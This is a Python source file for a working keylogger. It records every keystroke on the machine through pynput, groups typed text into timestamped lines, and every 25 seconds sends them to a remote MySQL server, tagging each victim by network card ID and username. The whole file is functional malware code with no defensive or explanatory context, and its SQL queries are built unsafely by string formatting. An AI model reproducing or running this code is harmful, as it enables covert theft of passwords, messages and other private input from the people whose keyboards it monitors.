import os, time, threading, pynput, json
import mysql.connector as mysql
from uuid import getnode as getNetworkID

dateFormat = "d_%d_%m_%y" #This date format is the index in the array to sort the recorded logs by dates. Why d_? To prevent MySQL Syntax errors!
cache = [ ] #Where each line from the buffer will be stored.

#Database connection and save functions ->

mysqldb = None

sessionID = getNetworkID( ) #Getting computer ID from network card.
sessionName = os.environ.get( "USERNAME" ) or "Unknow" #Getting computer username from eviroment variables.

class mysqlConnect:

    def __init__( self ):

        while True: #Loop try connect until achieve it.
            try:
                self.dbConnection = mysql.MySQLConnection( user = "USERNAME", password = "PASSWORD", host = "HOST", database = "DATABASE" ) #Put here your database connection info!
                self.dbCursor = self.dbConnection.cursor( )
                break #Stop loop if connection is established.
            except mysql.Error:
                print( "[ MySQL ] Couldn't connect to mysql database! Retrying in 5 seconds..." ) 
                time.sleep( 5 ) #Freeze the script during 5 seconds.

    def sessionLogIn( self ):

        self.dbCursor.execute( "SELECT * from `keylogs` WHERE sessionID = %i" % sessionID )
        dbQuery = self.dbCursor.fetchall( )

        if len( dbQuery ) == 0: #Check if sessionID already exist on database.
            self.dbCursor.execute( "INSERT INTO `keylogs` ( `sessionID`, `sessionName`, `jsonLog` ) VALUES ( '%i', '%s', JSON_OBJECT( '%s', JSON_ARRAY( ) ) )" % ( sessionID, sessionName, time.strftime( dateFormat ) ) )
            print( "[ MySQL ] New session has been added for this computer and now is connected! ( %i )" % sessionID )
            self.dbConnection.commit( ) #Update database to efectue new changes.
        else:
            print( "[ MySQL ] This computer already have a session and now is connected! ( %i )" % sessionID )

    def saveCache( self ):

        global cache; global mysqldb #Globalize variables before editing so that other functions can read it with the new values.

        if len( cache ) > 0: #Check if cache is empty.
            try:
                self.dbCursor.execute( "UPDATE `keylogs` SET `jsonLog` = JSON_MERGE_PRESERVE( jsonLog, '%s' ) WHERE sessionID = %i" % ( json.dumps( { time.strftime( dateFormat ): cache } ), sessionID ) ) #Concatenate in json except that what is already in the database.
                self.dbConnection.commit( ) #Update database to efectue new changes.
                cache = [ ] #After each save, cache variable'll be cleaned to save memory.
                print( "[ MySQL ] Cache was saved successful!" )
            except mysql.Error:
                mysqldb = mysqlConnect( ) #Try reconnect when connection was lost.


mysqldb = mysqlConnect( ) #Establish connection to database.
mysqldb.sessionLogIn( ) #Once the connection is established, open a new session for this computer.


#Keyboard buffering and timing functions ->


buffer = "" #Save each char in a line before save it in cache list.
specialChars = [ "['´']", "['`']" ]
bindKeys = [ "Key.enter", "Key.tab", "Key.up", "Key.down" ]

def keyboardBuffering( keyCode ):
    global buffer; global cache #Globalize variables before editing so that other functions can read it with the new values.
    if "Key." in keyCode or keyCode in specialChars: #Check if the pressed key's code is a bindKey or an special character.
        if keyCode == "Key.space":
            buffer += " " #Adding space to buffer when space is pressed.
        elif keyCode == "Key.backspace":
            buffer = buffer[ : -1 ] #Remove las char from buffer when backspace is pressed.
        elif keyCode in bindKeys: #Check if bindKey is pressed.
            if len( buffer ) > 0: #Check if buffer is empty.
                cache.append( [ time.strftime( "%H:%M:%S" ), buffer ] ) #Save current buffer in cache.
                buffer = "" #Clean buffer for a new line.
    else:
        buffer += keyCode.replace( "'", "" ) #Add in buffer the pressed char.


def checkTimer(  ):
    mysqldb.saveCache( ) #Save cache on database.
    timer = threading.Timer( 25, checkTimer ) #Call each 25 seconds to checkTime() function for saving!
    timer.start( ) #Needed to new timing start.

checkTimer( ) #Calling for first time checkTimer function. While loop won't works with pynput key event!

def onKeyDown( key ):
    keyboardBuffering( str( key ) ) #Change returned key to string before send to keyboardBuffering( ) it'll prevent errors!

with pynput.keyboard.Listener( on_press=onKeyDown ) as listener:
	listener.join( )
